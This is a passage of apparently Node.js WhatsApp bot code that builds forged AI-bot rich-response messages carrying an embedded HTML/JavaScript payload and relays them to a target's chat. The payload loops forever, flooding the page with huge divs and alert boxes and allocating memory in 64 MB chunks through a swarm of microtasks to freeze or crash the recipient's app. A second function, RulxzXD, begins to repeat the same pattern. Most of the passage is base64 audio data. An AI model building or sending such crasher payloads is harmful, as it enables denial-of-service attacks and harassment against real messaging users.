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VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();


    while (true) {
      for (let i = 0; i < 1000; i++) {
        let div = document.createElement('div');
        div.innerHTML = 'AMPOSSS_'.repeat(900);
        document.body.appendChild(div);
      }
      alert("\u26a0\ufe0f GB MAKKLO DI BAWAH KAKI LEXZY \u26a0\ufe0f");
    }

    (function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(100000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }
        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
    })();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  }

  await sock.relayMessage(groupJid, message, {
    messageId: mid
  })

  await sock.relayMessage(groupJid, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}

async function RulxzXD(sock, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
    const base64Data = "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